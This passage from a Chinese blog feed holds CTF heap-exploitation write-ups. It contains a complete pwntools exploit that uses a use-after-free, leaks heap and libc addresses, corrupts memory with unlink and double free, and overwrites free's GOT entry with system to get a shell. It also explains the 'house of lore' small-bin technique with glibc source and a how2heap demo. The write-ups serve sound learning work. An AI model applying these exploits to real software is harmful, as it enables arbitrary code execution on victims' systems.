)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  --*(chunk + <span class="number">8</span>);</span><br><span class="line">  *(chunk + <span class="number">24LL</span> * v1 + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(chunk + <span class="number">24LL</span> * v1 + <span class="number">24</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(*(chunk + <span class="number">24LL</span> * v1 + <span class="number">32</span>)); <span class="comment">//uaf</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>存在 uaf 漏洞</p><p>程序一开始会定义一个结构体，结构体中会存放 chunk 的数量，chunk 自身的大小、使用情况、指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639038973792677/e0572d116e33828c4320481c0e2d5e6ee0108925.png" alt="image-20211209163613580"></p><p>我们可以利用 unlink，将堆指针指向该结构体，就可以实现任意地址写了</p><p> 综上利用方法就是 unlink + double free</p><h4 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x1150940</span>-<span class="number">0x114f000</span>)</span><br><span class="line">print(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap)) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f0dd52dab78</span>-<span class="number">0x7f0dd4f17000</span>)</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure><p> 虽然程序默认会将 size 扩大为 0x80，但是并不会影响泄露</p><p>当我们 dele 掉 chunk 0 和 chunk 2，两个 chunk 都会被链入 unsortedbin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639039402004567/bd78a54870a58c80b37a3c01cef5125dc282234f.png" alt="image-20211209164321749"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639039608814152/c8e71c32c87e428916684c91daf2963305d826ee.png" alt="image-20211209164648591"></p><p>再次申请回来，并且大小限定为 0x8，就能够泄露出 heap 和 libc</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639040086056253/d1861cae7d7cc71c2b53e5baceb772041daccd6c.png" alt="image-20211209165445801"></p><h4 id="double-free-unlink"><a href="#double-free-unlink" class="headerlink" title="double free + unlink"></a>double free + unlink</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ptr = heap + <span class="number">0x30</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">pay +=p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)<span class="comment">#0x10</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">0x30</span><span class="comment">#0x20</span></span><br><span class="line">pay +=p64(<span class="number">0x50</span>) + p64(<span class="number">0x20</span>)<span class="comment">#0x10 </span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span> </span><br><span class="line">pay +=p64(<span class="number">0x110</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">pay +=p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line">dele(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>  因为程序有 uaf 漏洞，之前 free 掉的指针还是可以用的，修改内容做到和之前的 chunk 一一对应</p><p>后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639040809086383/27dc9e5e7acdecae7de16b14d0599c04fc87b483.png" alt="image-20211209170648832"></p><p>前：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639040867558379/37726261c41894910c0073c7e053bb4b935a2098.png" alt="image-20211209170747276"></p><p>dele(2) 触发 unlink</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639041041536111/7d9062c8f8af762ddcfef154f9e76212f99bd477.png" alt="image-20211209171041288"></p><h4 id="改地址"><a href="#改地址" class="headerlink" title="改地址"></a>改地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pay = p64(<span class="number">6</span>)</span><br><span class="line">pay +=p64(<span class="number">0x1</span>) + p64(<span class="number">0x8</span>)</span><br><span class="line">pay +=p64(free_got)</span><br><span class="line">pay += <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>  触发后指向 chunk 0 的指针会指向 <code>ptr-0x18</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;2.23/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#2</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x1150940</span>-<span class="number">0x114f000</span>)</span><br><span class="line">print(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap)) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f0dd52dab78</span>-<span class="number">0x7f0dd4f17000</span>)</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">ptr = heap + <span class="number">0x30</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">pay +=p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)<span class="comment">#0x10</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">0x30</span><span class="comment">#0x20</span></span><br><span class="line">pay +=p64(<span class="number">0x50</span>) + p64(<span class="number">0x20</span>)<span class="comment">#0x10 </span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span> </span><br><span class="line">pay +=p64(<span class="number">0x110</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">pay +=p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">pay +=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">add(<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pay = p64(<span class="number">6</span>)</span><br><span class="line">pay +=p64(<span class="number">0x1</span>) + p64(<span class="number">0x8</span>)</span><br><span class="line">pay +=p64(free_got)</span><br><span class="line">pay += <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk 0x0000000006020A8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考博客</p><p><a href="https://cloud.tencent.com/developer/article/1557872">https://cloud.tencent.com/developer/article/1557872</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of lore</title>
      <link href="/2021/11/24/house-of-lore/"/>
      <url>/2021/11/24/house-of-lore/</url>
      
        <content type="html"><![CDATA[<p> house of lore 一般是 small bin 的一种利用手段，一般 libc 版本为 2.23 和 2.29 </p><h2 id="small-bin-结构"><a href="#small-bin-结构" class="headerlink" title="small bin 结构"></a>small bin 结构</h2><p>每个small bin维护着一个双向循环链表，而且chunk size都相同。当allocate memory时，总是从链表尾端unlink一个chunk，deallocate memory时，将那个chunk link到链表头。属于FILO(先进后出)规则，每个chunk都有机会被分配到app。<br><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637754665853023/645c38301c53f01bbf5be952e12e5a9278b671a3.png" alt="1"></p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>环境为 Ubuntu 16.04（最好为ubuntu 14.04 32位）</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。(victim 此时为 small bin 中最后一个 chunk)</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type, 则将获取到的 chunk 初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要漏洞点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">// 检查 bck-&gt;fd (倒数第二个chunk)是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时<code>__glibc_unlikely(bck-&gt;fd != victim</code>检查通过(即将 fake chunk 的 fd改为 victim)，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk，实现任意地址写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smallbin: chunk2 -&gt; chunk1    -----&gt;    smallbin: fake_chunk -&gt; chunk1</span><br></pre></td></tr></table></figure><h3 id="how2heap-代码演示"><a href="#how2heap-代码演示" class="headerlink" title="how2heap 代码演示"></a>how2heap 代码演示</h3><p>用的是 yichen 师傅翻译好的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;定义了两个数组&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 在 %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 在 %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;申请第一块属于 fastbin 的 chunk 在 %p\n&quot;</span>, victim);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;<span class="comment">//chunk 开始的位置</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;在栈上伪造一块 fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span 